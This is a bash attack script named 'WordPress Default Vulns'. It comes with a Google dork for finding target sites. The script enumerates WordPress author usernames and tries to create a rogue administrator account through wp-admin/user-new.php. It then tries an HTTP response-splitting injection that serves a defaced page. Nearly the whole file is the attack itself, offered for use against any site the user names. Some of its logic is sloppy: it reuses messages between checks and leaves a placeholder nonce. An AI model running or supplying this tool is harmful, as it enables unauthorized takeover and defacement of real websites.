#!/bin/bash
# WordPress Default Vulns
# Google Dork: https://www.google.com/#q="intitle:WordPress"+"inurl:readme.html"
# @autor: Henrique Bissoli Silva (emp.shad@gmail.com)
# Updates: https://github.com/Shadowz3n/WP-Vuln

RED=`tput setaf 1`
GREEN=`tput setaf 2`
NC=`tput sgr0`

set -i

tput clear
exiting(){
	tput clear
	rm -f /tmp/tempfile
	echo "${GREEN}Exiting..${NC}"
	exit 1
}
trap exiting SIGINT # Ctrl+C
if [[ "$1" ]]; then
	if ping -c 1 $(echo ${1/$(echo $1 | grep :// | sed -e's,^\(.*://\).*,\1,g')}) &> /dev/null; then
		read -p "Enumerate users ? > [Y/n] " enum
		if [[ $enum = 'Y' || $enum = 'y' ]]; then
			# Enumerate Author Users
			echo -e "\t${GREEN}Enumerating usernames.. 1-5${NC}"
			USERS=`for i in {1..10}; do curl -s -L -i $1/?author=$i | grep -E -o "\" title=\"View all posts by [a-z0-9A-Z\-\.]*|Location:.*" | sed 's/\// /g' | cut -f 6 -d ' ' | grep -v "^$"; done`
			if [[ "$USERS" != '' ]]; then
				echo -e "\t\t${GREEN}$USERS${NC}\n"
			else
				echo -e "${RED}\t[It was not possible to enumerate users]${NC}\n"
			fi
		fi

		# WordPress <= 3.3.1
		echo -e "\t${GREEN}WordPress <= 3.3.1 Adding new admin..${NC}"
		add_admin=`curl -s -o "/dev/null" -w "%{http_code}" "$1/wp-admin/user-new.php" -d "action=createuser&_wpnonce_create-user=<sniffed_value>&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&user_login=admin2&email=admin2@admin.com&first_name=admin2@admin.com&last_name=&url=&pass1=password&pass2=password&role=administrator&createuser=Add+New+User+"`
		if [[ "$add_admin" = '200' ]]; then
			echo -e "${GREEN}\tLink: $1/wp-admin \n\tLogin: admin2 \n\tPass: password${NC}\n"
		else
			echo -e "\t${RED}[Fails to add admin]${NC}\n"
		fi
		
		# WordPress <= 1.2
		echo -e "\t${GREEN}Wordpress <= 1.2 Trying to login..${NC}"
		login=`curl -s -o "/dev/null" -w "%{http_code}" "$1/?action=login&mode=profile&log=USER&pwd=PASS&text=%0d%0aConnection: Keep-Alive%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.0 200 OK%0d%0aContent-Length: 21%0d%0aContent-Type: text/html%0d%0a%0d%0a{html}*defaced*{/html} "`
		if [[ "$login" = '200' ]]; then
			echo -e "${GREEN}\tLink: $1/wp-admin \n\tLogin: admin2 \n\tPass: password${NC}\n"
		else
			echo -e "\t${RED}[Fails to add admin]${NC}\n"
		fi
	else
		echo -e "\t${RED}[$1 is down]${NC}"
	fi
else
	echo -e "Usage: bash $0 site.com"
fi
